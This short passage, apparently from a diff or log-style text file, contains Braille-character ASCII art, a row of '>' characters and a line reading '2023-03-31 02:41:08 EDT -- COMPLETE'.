+⣿⠀⠀⢸⡆⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡦⠄⢹⡆⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⠈⣿⠀⠀⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡓⠚⠃⠀⠀⠀⠀⠀⠀⠀
+⢹⡄⠀⠀⢻⣆⣂⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⡇⠀⠀⠀⠙⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀
+⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢄⣾⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡀⠀⠀⢀⣼⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠙⢧⣀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡇⠀⠀⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⣠⣾⣥⣤⡴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠙⠷⢦⣤⣀⣀⣠⡴⠟⠉⠛⠶⠦⠤⠶⠾⠋⠉⠛⠓⠶⠚⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+2023-03-31 02:41:08 EDT -- COMPLETE
 
